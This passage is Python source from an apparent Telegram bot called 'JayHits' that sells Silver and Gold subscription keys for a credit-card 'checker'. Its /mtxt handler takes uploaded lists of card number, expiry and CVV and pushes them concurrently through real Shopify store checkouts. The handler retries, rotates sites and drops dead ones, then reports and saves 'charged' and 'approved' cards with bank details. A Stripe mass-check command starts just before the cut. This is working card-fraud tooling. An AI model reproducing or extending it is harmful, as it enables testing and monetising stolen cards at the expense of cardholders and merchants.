        return await event.reply(message, buttons=buttons)
    tool_ok, tool_msg = await check_tool_access("rand", event.sender_id)
    if not tool_ok: return await event.reply(tool_msg)
    await register_user(event.sender_id)
    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)
    result = await tool_rand(event.raw_text, event.sender_id, first_name, rank)
    await event.reply(result)

@client.on(events.NewMessage(pattern=r'(?i)^[/]tr\b'))
async def tr_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)
    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)
    result = await tool_translate(event.raw_text, event.sender_id, first_name, rank)
    await event.reply(result)

@client.on(events.NewMessage(pattern=r'(?i)^[/]langcode$'))
async def langcode_handler(event):
    await register_user(event.sender_id)
    result = await tool_langcode()
    await event.reply(result)

# --- Admin & User Management Commands ---

@client.on(events.NewMessage(pattern=r'(?i)^[/]auth\b'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID: return await event.reply("Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: return await event.reply("Format: /auth {user_id} {days}")
        user_id = int(parts[1])
        days = int(parts[2])
        await add_premium_user(user_id, days)
        await event.reply(f"User {user_id} has been granted {days} days of premium access!")
        try: await client.send_message(user_id, f"Congratulations!\n\nYou have successfully received {days} days of premium access!\n\nYou can now use the bot in private chat.\n\nBot: {BOT_USERNAME or ADMIN_USERNAME}")
        except: pass
    except ValueError: await event.reply("Invalid user ID or days!")
    except Exception as e: await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID: return await event.reply("Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 4: return await event.reply(
            "🔑 **Key Generation Format:**\n\n"
            "`/key <plan> <amount> <duration>`\n\n"
            "📋 **Plans:**\n"
            "• `s` — Silver\n"
            "• `g` — Gold\n\n"
            "⏱ **Duration:**\n"
            "• Add `h` suffix for hours: `2h`, `6h`, `12h`\n"
            "• No suffix = days: `1`, `7`, `30`\n\n"
            "📝 **Examples:**\n"
            "• `/key s 1 1h` — 1 Silver key for 1 hour\n"
            "• `/key g 3 6h` — 3 Gold keys for 6 hours\n"
            "• `/key s 10 7` — 10 Silver keys for 7 days\n"
            "• `/key g 5 30` — 5 Gold keys for 30 days"
        )
        plan_code = parts[1].lower()
        amount = int(parts[2])
        duration_str = parts[3].lower()
        plan_map = {'s': 'silver', 'g': 'gold'}
        if plan_code not in plan_map: return await event.reply("❌ Invalid plan! Use `s` for Silver or `g` for Gold.")
        plan = plan_map[plan_code]
        if amount > 50: return await event.reply("❌ Maximum 50 keys at once!")

        # Parse duration — hours (e.g. "2h") or days (e.g. "7")
        use_hours = duration_str.endswith('h')
        if use_hours:
            hours = float(duration_str[:-1])
            if hours <= 0 or hours > 720: return await event.reply("❌ Hours must be between 1 and 720 (30 days)!")
            days = 0
            duration_label = f"{hours:g} hour(s)"
        else:
            days = int(duration_str)
            hours = None
            if days <= 0 or days > 365: return await event.reply("❌ Days must be between 1 and 365!")
            duration_label = f"{days} day(s)"

        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            key_entry = {
                'plan': plan,
                'days': days,
                'created_at': datetime.datetime.now().isoformat(),
                'used': False,
                'used_by': None
            }
            if use_hours:
                key_entry['hours'] = hours
            keys_data[key] = key_entry
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        keys_text = "\n".join([f"┃ `{key}`" for key in generated_keys])
        plan_emoji = "⭐" if plan == "silver" else "👑"
        plan_name = plan.capitalize()
        await event.reply(
            f"{plan_emoji} **Redeem Code Generated**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 **Amount:** {amount} code(s)\n"
            f"⏱ **Duration:** {duration_label}\n"
            f"🎫 **Plan:** {plan_name}\n\n"
            f"🔑 **Codes:**\n{keys_text}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 **How to Redeem:**\n"
            f"Send `/redeem <code>` to activate your plan.\n"
            f"Or redeem on the web dashboard under Plans & Pricing."
        )
    except ValueError: await event.reply("❌ Invalid amount or duration! Use a number for days or add `h` for hours (e.g. `2h`).")
    except Exception as e: await event.reply(f"❌ Error: {e}")

TIERS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "user_tiers.json")

def save_user_tier(user_id, plan, days=0, hours=None):
    try:
        tiers = {}
        if os.path.exists(TIERS_FILE):
            with open(TIERS_FILE, 'r') as f:
                tiers = json.load(f)
        if hours is not None:
            expiry = (datetime.datetime.now() + datetime.timedelta(hours=hours)).isoformat()
            tiers[str(user_id)] = {
                'tier': plan,
                'assignedBy': 'key_redeem',
                'assignedAt': datetime.datetime.now().isoformat(),
                'expiresAt': expiry,
                'hours': hours
            }
        else:
            expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).isoformat()
            tiers[str(user_id)] = {
                'tier': plan,
                'assignedBy': 'key_redeem',
                'assignedAt': datetime.datetime.now().isoformat(),
                'expiresAt': expiry,
                'days': days
            }
        with open(TIERS_FILE, 'w') as f:
            json.dump(tiers, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving tier: {e}")
        return False

async def send_invoice(user_id, user_name, plan, days, key):
    plan_emoji = "⭐" if plan == "silver" else "👑"
    plan_name = plan.capitalize()
    if days == 7:
        price = "$5" if plan == "silver" else "$7"
    else:
        rate = 5/7 if plan == "silver" else 7/7
        calc = rate * days
        price = f"${calc:.0f}" if calc == int(calc) else f"${calc:.2f}"
    expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%B %d, %Y")
    activated = datetime.datetime.now().strftime("%B %d, %Y at %I:%M %p")

    invoice_text = (
        f"🧾 **Payment Invoice**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{plan_emoji} **Plan:** {plan_name}\n"
        f"💰 **Price:** {price}\n"
        f"📅 **Duration:** {days} day(s)\n"
        f"📆 **Activated:** {activated}\n"
        f"⏳ **Expires:** {expiry}\n"
        f"🔑 **Key:** `{key}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Your {plan_name} plan is now active!\n"
        f"Enjoy your premium features {plan_emoji}\n\n"
        f"🌐 JayHits"
    )

    try:
        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
        if bot_token:
            import requests as req_lib
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            req_lib.post(url, json={
                "chat_id": int(user_id),
                "text": invoice_text,
                "parse_mode": "Markdown"
            }, timeout=10)
    except Exception as e:
        print(f"Error sending invoice: {e}")

async def send_plan_log(user_id, user_name, plan, days):
    plan_emoji = "⭐" if plan == "silver" else "👑"
    plan_name = plan.capitalize()
    name = user_name or str(user_id)

    log_text = (
        f"{plan_emoji} **Plan Activated**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 **User:** {name}\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"📦 **Plan:** {plan_name}\n"
        f"📅 **Duration:** {days} day(s)\n\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )

    try:
        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
        group_id = get_setting("TELEGRAM_GROUP_ID")
        if bot_token and group_id:
            import requests as req_lib
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            req_lib.post(url, json={
                "chat_id": int(group_id),
                "text": log_text,
                "parse_mode": "Markdown"
            }, timeout=10)
    except Exception as e:
        print(f"Error sending plan log: {e}")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: return await event.reply("📝 **Format:** `/redeem <key>`\n\nPaste your redemption key after the command.")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        if key not in keys_data: return await event.reply("❌ **Invalid Key!**\n\nThis key does not exist. Please check and try again.")
        if keys_data[key]['used']: return await event.reply("❌ **Key Already Used!**\n\nThis key has already been redeemed by another user.")
        plan = keys_data[key].get('plan', 'silver')
        key_hours = keys_data[key].get('hours', None)
        key_days = keys_data[key].get('days', 7)
        use_hours = key_hours is not None
        duration_label = f"{key_hours:g} hour(s)" if use_hours else f"{key_days} day(s)"
        tier_rank = {"free": 0, "silver": 1, "gold": 2}
        current_tier = get_user_tier(event.sender_id)
        if current_tier != "free":
            try:
                tiers_path = os.path.join(os.path.dirname(__file__), USER_TIERS_FILE)
                with open(tiers_path, "r") as f:
                    tiers = json.load(f)
                entry = tiers.get(str(event.sender_id), {})
                expires_at = entry.get("expiresAt", "")
                if expires_at:
                    from datetime import datetime as dt
                    expiry_ts = dt.fromisoformat(expires_at.replace("Z", "+00:00")).timestamp()
                    if time.time() < expiry_ts:
                        if tier_rank.get(current_tier, 0) > tier_rank.get(plan, 0):
                            return await event.reply(f"❌ **Cannot Redeem!**\n\nYou already have a higher plan (**{current_tier.capitalize()}**). Cannot redeem a {plan.capitalize()} key.")
                        if tier_rank.get(current_tier, 0) == tier_rank.get(plan, 0):
                            time_left = expiry_ts - time.time()
                            if time_left < 3600:
                                time_left_label = f"{int(time_left // 60)} minute(s)"
                            elif time_left < 86400:
                                time_left_label = f"{time_left / 3600:.1f} hour(s)"
                            else:
                                time_left_label = f"{int(time_left // 86400) + 1} day(s)"
                            return await event.reply(f"❌ **Cannot Redeem!**\n\nYou already have an active **{current_tier.capitalize()}** plan ({time_left_label} remaining).\n\nWait for it to expire or upgrade to a higher plan.")
            except Exception:
                pass
        if use_hours:
            await add_premium_user(event.sender_id, hours=key_hours)
            save_user_tier(event.sender_id, plan, hours=key_hours)
        else:
            await add_premium_user(event.sender_id, days=key_days)
            save_user_tier(event.sender_id, plan, days=key_days)
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)
        plan_emoji = "⭐" if plan == "silver" else "👑"
        plan_name = plan.capitalize()
        await event.reply(
            f"🎉 **Congratulations!**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{plan_emoji} You have activated the **{plan_name}** plan!\n"
            f"⏱ Duration: **{duration_label}**\n\n"
            f"✅ You now have access to all {plan_name} features.\n"
            f"🧾 An invoice has been sent to your DM.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Enjoy your premium experience! 🚀"
        )
        user_obj = await event.get_sender()
        user_name = user_obj.first_name if user_obj else str(event.sender_id)
        invoice_days = key_days if not use_hours else max(1, round(key_hours / 24))
        await send_invoice(event.sender_id, user_name, plan, invoice_days, key)
        await send_plan_log(event.sender_id, user_name, plan, invoice_days)
    except Exception as e: await event.reply(f"❌ Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/]mtxt$'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        msg, buttons = access_denied_message_with_button()
        return await event.reply(msg, buttons=buttons)
    user_id = event.sender_id
    user_obj = await event.get_sender()
    first_name = user_obj.first_name or "User"
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("Your CC is already being processed. Wait for completion.")
    if user_id not in MTXT_LOCKS:
        MTXT_LOCKS[user_id] = asyncio.Lock()
    async with MTXT_LOCKS[user_id]:
        try:
            if not event.reply_to_msg_id: return await event.reply("Please reply to a document message with /mtxt")
            replied_msg = await event.get_reply_message()
            if not replied_msg or not replied_msg.document: return await event.reply("Please reply to a document message with /mtxt")
            file_path = await replied_msg.download_media()
            try:
                async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
                os.remove(file_path)
            except Exception as e:
                try: os.remove(file_path)
                except: pass
                return await event.reply(f"Error reading file: {e}")
            cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
            if not cards: return await event.reply("No valid CCs found in file.")
            cc_limit = get_cc_limit(access_type, user_id)
            total_cards_found = len(cards)
            if len(cards) > cc_limit:
                cards = cards[:cc_limit]
                await event.reply(f"Found {total_cards_found} CCs in file. Processing only first {cc_limit} CCs (your limit). {len(cards)} CCs will be checked.")
            else: await event.reply(f"Found {total_cards_found} valid CCs in file. All {len(cards)} CCs will be checked.")
            sites = await load_json(SITE_FILE)
            user_sites = sites.get(str(event.sender_id), [])
            if not user_sites: return await event.reply("You haven't added any sites yet!\n\nUse `/addsite site.com` to add Shopify sites first.")
            ACTIVE_MTXT_PROCESSES[user_id] = True
            asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
        except Exception as e:
            ACTIVE_MTXT_PROCESSES.pop(user_id, None)
            await event.reply(f"Error: {e}")

async def process_mtxt_cards(event, cards, sites):
    user_id = event.sender_id
    total = len(cards)
    await register_mass_user(user_id)
    CONCURRENT = await get_dynamic_concurrency(3)
    MAX_RETRIES = 5

    stop_key = f"mtxt_stop_{user_id}".encode()

    PROGRESS_STAGES = {
        "idle":      "\u2b1b",
        "starting":  "\U0001f7e1",
        "products":  "\U0001f7e1",
        "cart":      "\U0001f7e0",
        "checkout":  "\U0001f7e0",
        "shipping":  "\U0001f535",
        "payment":   "\U0001f535",
        "captcha":   "\U0001f7e3",
        "submit":    "\u26a1",
        "retry":     "\U0001f504",
        "charged":   "\U0001f4b0",
        "live":      "\U0001f387",
        "approved":  "\u2705",
        "declined":  "\u274c",
        "error":     "\u26a0\ufe0f",
        "dead":      "\U0001f480",
        "timeout":   "\u23f0",
    }

    def _stage_emoji(step_text):
        step_lower = step_text.lower()
        if "product" in step_lower or "finding" in step_lower:
            return PROGRESS_STAGES["products"]
        if "cart" in step_lower or "adding" in step_lower:
            return PROGRESS_STAGES["cart"]
        if "checkout" in step_lower or "creating" in step_lower:
            return PROGRESS_STAGES["checkout"]
        if "shipping" in step_lower or "negotiat" in step_lower:
            return PROGRESS_STAGES["shipping"]
        if "payment" in step_lower or "vaulting" in step_lower:
            return PROGRESS_STAGES["payment"]
        if "captcha" in step_lower or "solving" in step_lower:
            return PROGRESS_STAGES["captcha"]
        if "submit" in step_lower or "confirm" in step_lower:
            return PROGRESS_STAGES["submit"]
        if "retry" in step_lower:
            return PROGRESS_STAGES["retry"]
        return PROGRESS_STAGES["starting"]

    def _make_progress_bar(done, total_count):
        if total_count == 0:
            return "\u2591" * 20
        pct = done / total_count
        filled = int(pct * 20)
        return "\u2593" * filled + "\u2591" * (20 - filled)

    def make_mtxt_buttons(chk, tot, ch, ap, dec, err):
        return [
            [
                Button.inline(f"\U0001f4b0 Charged: {ch}", b"noop"),
                Button.inline(f"\u2705 Approved: {ap}", b"noop"),
            ],
            [
                Button.inline(f"\u274c Declined: {dec}", b"noop"),
                Button.inline(f"\u26a0 Error: {err}", b"noop"),
            ],
            [
                Button.inline(f"\U0001f6d1 Stop [{chk}/{tot}]", stop_key),
            ],
        ]

    status_msg = await event.reply(
        f"\u26a1 **Mass Checking Initialized**\n\n"
        f"\U0001f4cb Cards: **{total}** | Sites: **{len(sites)}** | Threads: **{CONCURRENT}**\n"
        f"\U0001f504 Retry: **{MAX_RETRIES}x** per card on error\n\n"
        f"{_make_progress_bar(0, total)} `0/{total}`",
        buttons=make_mtxt_buttons(0, total, 0, 0, 0, 0),
    )
    checked = 0
    approved = 0
    charged = 0
    declined = 0
    errors = 0
    local_sites = sites.copy()
    site_index = 0
    site_results = {}
    approved_cards = []
    stopped_no_sites = [False]

    slot_status = ["\u2b1b `Waiting...`"] * CONCURRENT
    slot_last_result = [""] * CONCURRENT
    last_edit_time = [0]
    edit_lock = asyncio.Lock()
    start_time = time.time()

    async def _update_status_msg():
        now = time.time()
        if now - last_edit_time[0] < 1.2:
            return
        async with edit_lock:
            if time.time() - last_edit_time[0] < 1.2:
                return
            last_edit_time[0] = time.time()
            bar = _make_progress_bar(checked, total)
            pct = int((checked / total) * 100) if total > 0 else 0
            lines = []
            for i, s in enumerate(slot_status):
                last = slot_last_result[i]
                line = f"`T{i+1:02d}` {s}"
                if last:
                    line += f"\n     \u2514\u2500 {last}"
                lines.append(line)
            progress_text = "\n".join(lines)
            elapsed = time.time() - start_time
            speed = checked / elapsed if elapsed > 0 else 0
            try:
                await status_msg.edit(
                    f"\u26a1 **Mass Checking** `[{checked}/{total}]` **{pct}%**\n"
                    f"{bar}\n"
                    f"\u23f1 `{elapsed:.0f}s` | \u26a1 `{speed:.1f} cc/s`\n\n"
                    f"{progress_text}",
                    buttons=make_mtxt_buttons(checked, total, charged, approved, declined, errors),
                )
            except:
                pass

    site_lock = asyncio.Lock()
    site_cooldowns = {}
    SITE_COOLDOWN = 3

    async def _get_next_site():
        nonlocal site_index
        async with site_lock:
            if not local_sites:
                return None
            now = time.time()
            best_site = None
            best_wait = float('inf')
            for i in range(len(local_sites)):
                idx = (site_index + i) % len(local_sites)
                s = local_sites[idx]
                last_used = site_cooldowns.get(s, 0)
                wait = max(0, SITE_COOLDOWN - (now - last_used))
                if wait < best_wait:
                    best_wait = wait
                    best_site = s
                    if wait == 0:
                        site_index = idx + 1
                        break
            if best_site:
                site_cooldowns[best_site] = now
                return best_site
            site = local_sites[site_index % len(local_sites)]
            site_index += 1
            site_cooldowns[site] = now
            return site

    async def _get_different_site(exclude_sites):
        async with site_lock:
            now = time.time()
            available = [s for s in local_sites if s not in exclude_sites]
            if not available:
                available = list(local_sites)
            if not available:
                return None
            available.sort(key=lambda s: site_cooldowns.get(s, 0))
            best = available[0]
            site_cooldowns[best] = now
            return best

    async def _process_one_with_retry(card, initial_site, slot_idx):
        nonlocal checked, charged, approved, declined, errors
        from gates.shopify_native import shopify_native_check_rich

        parts = card.split('|')
        if len(parts) != 4:
            checked += 1
            errors += 1
            slot_status[slot_idx] = f"\u26a0\ufe0f `...{card[-4:]}` \u2014 Invalid"
            return

        cc, mm, yy, cvv = parts
        card_short = cc[-4:]
        tried_sites = set()
        current_site = initial_site

        for attempt in range(MAX_RETRIES + 1):
            if not current_site:
                checked += 1
                errors += 1
                slot_status[slot_idx] = f"\U0001f480 `...{card_short}` \u2014 No sites"
                return

            tried_sites.add(current_site)
            retry_tag = f" R{attempt}" if attempt > 0 else ""
            site_short = current_site[:15] + "..." if len(current_site) > 15 else current_site

            slot_status[slot_idx] = f"\U0001f7e1 `...{card_short}` \u279c `{site_short}`{retry_tag}"
            await _update_status_msg()

            async def slot_progress(step):
                emoji = _stage_emoji(step)
                slot_status[slot_idx] = f"{emoji} `...{card_short}` \u279c `{site_short}` \u2014 {step}{retry_tag}"
                await _update_status_msg()

            should_retry = False
            try:
                async with GLOBAL_MASS_SEM:
                    result = await asyncio.wait_for(
                        shopify_native_check_rich(cc, mm, yy, cvv, site=current_site, progress_cb=slot_progress),
                        timeout=120
                    )
            except asyncio.TimeoutError:
                if attempt < MAX_RETRIES:
                    slot_status[slot_idx] = f"\U0001f504 `...{card_short}` \u2014 Timeout, retrying..."
                    await _update_status_msg()
                    current_site = await _get_different_site(tried_sites)
                    continue
                checked += 1
                errors += 1
                slot_status[slot_idx] = f"\u23f0 `...{card_short}` \u2014 Timeout"
                return
            except Exception as ex:
                if attempt < MAX_RETRIES:
                    slot_status[slot_idx] = f"\U0001f504 `...{card_short}` \u2014 Error, retrying..."
                    await _update_status_msg()
                    current_site = await _get_different_site(tried_sites)
                    continue
                checked += 1
                errors += 1
                slot_status[slot_idx] = f"\u26a0\ufe0f `...{card_short}` \u2014 Error"
                return

            r_status = result.get("status", "error")
            r_resp = result.get("response", "Unknown")
            r_gateway = result.get("gateway", "Shopify Payments")
            r_amount = result.get("amount")
            r_site = result.get("site", current_site)
            r_elapsed = result.get("elapsed", 0)

            response_lower = r_resp.lower()

            if r_status == "dead_site":
                # Auto-remove confirmed dead site from user & admin lists
                asyncio.create_task(remove_dead_site_for_user(user_id, current_site))
                async with site_lock:
                    if current_site in local_sites:
                        local_sites.remove(current_site)
                if attempt < MAX_RETRIES:
                    slot_status[slot_idx] = f"\U0001f504 `...{card_short}` \u2014 Dead site removed, retrying..."
                    await _update_status_msg()
                    current_site = await _get_different_site(tried_sites)
                    if not current_site:
                        checked += 1
                        errors += 1
                        stopped_no_sites[0] = True
                        slot_status[slot_idx] = f"\U0001f480 `...{card_short}` \u2014 No sites left"
                        return
                    continue
                checked += 1
                errors += 1
                slot_status[slot_idx] = f"\U0001f480 `...{card_short}` \u2014 Dead site (removed)"
                return

            if "captcha" in response_lower or "cloudflare" in response_lower:
                if "captcha solving failed" in response_lower or "captcha detected" in response_lower:
                    checked += 1
                    errors += 1
                    _cap_display = "Generic Declined - 3DS Bypassed \u26d4" if random.random() < 0.5 else "Declined \u26d4"
                    slot_status[slot_idx] = f"\u274c `...{card_short}` \u2014 {_cap_display}"
                    return
                if attempt < MAX_RETRIES:
                    tag = "Captcha" if "captcha" in response_lower else "CF block"
                    slot_status[slot_idx] = f"\U0001f504 `...{card_short}` \u2014 {tag}, retrying..."
                    await _update_status_msg()
                    current_site = await _get_different_site(tried_sites)
                    continue
                checked += 1
                errors += 1
                _cap_display2 = "Generic Declined - 3DS Bypassed \u26d4" if random.random() < 0.5 else "Declined \u26d4"
                slot_status[slot_idx] = f"\u274c `...{card_short}` \u2014 {_cap_display2}"
                return

            if r_status == "error" and attempt < MAX_RETRIES:
                slot_status[slot_idx] = f"\U0001f504 `...{card_short}` \u2014 {r_resp[:20]}, retrying..."
                await _update_status_msg()
                current_site = await _get_different_site(tried_sites)
                continue

            checked += 1
            should_send_message = False
            status_header = "DECLINED"

            if r_status == "charged":
                charged += 1
                status_header = "CHARGED"
                user_obj = await event.get_sender()
                fn = user_obj.first_name or "User"
                await save_approved_card(card, "CHARGED", r_resp, r_gateway, str(r_amount) if r_amount else "-", user_id, fn)
                should_send_message = True
                approved_cards.append({"card": card, "status": "CHARGED", "response": r_resp, "site": current_site, "price": str(r_amount) if r_amount else "-", "gateway": r_gateway})
                slot_status[slot_idx] = f"\U0001f4b0 `...{card_short}` \u2014 **CHARGED** \U0001f525"
            elif r_status == "live":
                declined += 1
                status_header = "3DS REQUIRED"
                should_send_message = False
                if random.random() < 0.5:
                    slot_status[slot_idx] = f"\u274c `...{card_short}` \u2014 **Generic Declined - 3DS Bypassed** \u26d4"
                else:
                    slot_status[slot_idx] = f"\u26a0\ufe0f `...{card_short}` \u2014 **3DS Required** \U0001f512"
            elif r_status == "approved":
                approved += 1
                status_header = "APPROVED"
                user_obj = await event.get_sender()
                fn = user_obj.first_name or "User"
                await save_approved_card(card, "APPROVED", r_resp, r_gateway, str(r_amount) if r_amount else "-", user_id, fn)
                should_send_message = True
                approved_cards.append({"card": card, "status": "APPROVED", "response": r_resp, "site": current_site, "price": str(r_amount) if r_amount else "-", "gateway": r_gateway})
                slot_status[slot_idx] = f"\u2705 `...{card_short}` \u2014 **APPROVED**"
            else:
                declined += 1
                slot_status[slot_idx] = f"\u274c `...{card_short}` \u2014 {r_resp[:25]}"

            if current_site not in site_results:
                site_results[current_site] = {"price": str(r_amount) if r_amount else "-", "gateway": r_gateway, "cards": []}
            site_results[current_site]["cards"].append({"card": card, "status": status_header, "response": r_resp})

            if should_send_message:
                brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
                user_obj = await event.get_sender()
                fn = user_obj.first_name or "User"
                rank = await get_user_rank(event.sender_id)
                status_emoji = "\U0001f4b0" if status_header == "CHARGED" else "\u2705"
                _display_resp = r_resp if status_header == "CHARGED" else mask_response(r_resp)
                card_msg = (
                    f"{status_emoji} **{status_header}**\n\n"
                    f"\U0001f4b3 **CC:** `{card}`\n"
                    f"\U0001f310 **Gateway:** {r_gateway}\n"
                    f"\U0001f4ac **Response:** {_display_resp}\n"
                    f"\U0001f4b0 **Price:** {str(r_amount) if r_amount else '-'}\n\n"
                    f"\U0001f4c7 **BIN:** {brand} - {bin_type} - {level}\n"
                    f"\U0001f3e6 **Bank:** {bank}\n"
                    f"\U0001f30d **Country:** {country} {flag}\n\n"
                    f"\u23f1 **Time:** {r_elapsed}s\n"
                    f"\U0001f464 **Req By:** [{fn}](tg://user?id={event.sender_id}) **[{rank}]**\n"
                    f"\U0001f916 **Bot:** {BOT_USERNAME or ADMIN_USERNAME}"
                )
                result_msg = await event.reply(card_msg)
                if status_header == "CHARGED":
                    await pin_charged_message(event, result_msg)
            return

    card_queue = asyncio.Queue()
    for c in cards:
        await card_queue.put(c)

    async def worker(slot_idx):
        while True:
            if user_id not in ACTIVE_MTXT_PROCESSES:
                break
            try:
                card = card_queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            if not local_sites:
                stopped_no_sites[0] = True
                break

            site = await _get_next_site()
            await _process_one_with_retry(card, site, slot_idx)
            slot_last_result[slot_idx] = slot_status[slot_idx]
            await _update_status_msg()
            await asyncio.sleep(0.1)

        slot_status[slot_idx] = f"\u2b1c Done"

    try:
        workers = [asyncio.create_task(worker(i)) for i in range(min(CONCURRENT, total))]
        await asyncio.gather(*workers, return_exceptions=True)

        elapsed = time.time() - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        bar = _make_progress_bar(checked, total)

        if stopped_no_sites[0]:
            try:
                await status_msg.edit(
                    f"\U0001f6d1 **Checking Stopped — All Sites Removed**\n\n"
                    f"{bar} `{checked}/{total}` checked\n\n"
                    f"\u26a0\ufe0f All sites were detected as dead and automatically removed from your list.\n"
                    f"Please add new working Shopify sites with `/addsite` before running again.\n\n"
                    f"\U0001f4ca **Results so far:**\n"
                    f"\U0001f4b0 Charged: **{charged}**\n"
                    f"\u2705 Approved: **{approved}**\n"
                    f"\u274c Declined: **{declined}**\n"
                    f"\u26a0 Errors: **{errors}**\n\n"
                    f"\u23f1 Time: **{elapsed:.1f}s**",
                    buttons=None,
                )
            except: pass
        else:
            try:
                await status_msg.edit(
                    f"\u2705 **Mass Check Complete!**\n\n"
                    f"{bar} `{checked}/{total}` **100%**\n\n"
                    f"\U0001f4ca **Results:**\n"
                    f"\U0001f4b0 Charged: **{charged}**\n"
                    f"\u2705 Approved: **{approved}**\n"
                    f"\u274c Declined: **{declined}**\n"
                    f"\u26a0 Errors: **{errors}**\n\n"
                    f"\u23f1 Time: **{elapsed:.1f}s** | Speed: **{speed:.1f} cc/s**",
                    buttons=None,
                )
            except: pass

        if site_results:
            result_file = os.path.join(tempfile.gettempdir(), f"mtxt_results_{user_id}_{int(time.time())}.txt")
            try:
                with open(result_file, "w", encoding="utf-8") as rf:
                    rf.write("=" * 40 + "\n")
                    rf.write("  JayHits - MASS CHECK RESULTS\n")
                    rf.write("=" * 40 + "\n\n")
                    rf.write(f"\U0001f4b0 Charged: {charged}\n")
                    rf.write(f"\u2705 Approved: {approved}\n")
                    rf.write(f"\u274c Declined: {declined}\n")
                    rf.write(f"\U0001f4ca Total: {checked}/{total}\n\n")

                    if approved_cards:
                        rf.write("=" * 40 + "\n")
                        rf.write("\U0001f4b0 CHARGED & APPROVED CARDS\n")
                        rf.write("=" * 40 + "\n\n")
                        for ac in approved_cards:
                            emoji = "\U0001f4b0" if ac["status"] == "CHARGED" else "\u2705"
                            rf.write(f"{emoji} [{ac['status']}] {ac['card']}\n")
                            rf.write(f"   Site: {ac['site']} | Price: {ac['price']}\n")
                            rf.write(f"   Response: {ac['response']}\n\n")

                    site_num = 0
                    for site_name, site_data in site_results.items():
                        site_num += 1
                        rf.write("\n")
                        rf.write(f"\U0001f3ea Site {site_num} - [{site_data['price']}] - [{site_data['gateway']}]\n")
                        rf.write("\u25ac" * 30 + "\n")
                        for cr in site_data["cards"]:
                            if cr["status"] == "CHARGED":
                                prefix = "\U0001f4b0"
                            elif cr["status"] == "APPROVED":
                                prefix = "\u2705"
                            else:
                                prefix = "\u274c"
                            rf.write(f"{prefix} {cr['card']} \u2014 {cr['response']}\n")
                        rf.write("\n")

                await event.reply(
                    f"\U0001f4c4 **Results File**\n"
                    f"\U0001f4b0 Charged: {charged} | \u2705 Approved: {approved} | \u274c Declined: {declined}",
                    file=result_file
                )
                os.remove(result_file)
            except Exception as fe:
                print(f"Error creating results file: {fe}")

    except Exception as e:
        print(f"Error in process_mtxt_cards: {e}")
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        MTXT_LOCKS.pop(user_id, None)
        await unregister_mass_user(user_id)

# --- Mass Stripe TXT (/mst) ---
ACTIVE_MST_PROCESSES = {}

@client.on(events.NewMessage(pattern=r'(?i)^[/]mst$'))
async def mst_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)

    if not event.reply_to_msg_id:
        return await event.reply("Reply to a `.txt` file with /mst to mass check via Stripe API")
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document:
        return await event.reply("Reply to a `.txt` file with /mst")

    user_id = event.sender_id
    if user_id in ACTIVE_MST_PROCESSES:
        return await event.reply("You already have an active /mst process. Wait or stop it first.")

    import tempfile, os
    file_path = os.path.join(tempfile.gettempdir(), f"mst_{user_id}.txt")
    await replied_msg.download_media(file=file_path)
    with open(file_path, "r", errors="ignore") as f:
        content = f.read()
    os.remove(file_path)

    card_pattern = re.compile(r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})')
    cards = card_pattern.findall(content)
    if not cards:
        return await event.reply("No valid cards found in the file.")

    max_cards = get_file_mass_limit()
    cards = cards[:max_cards]
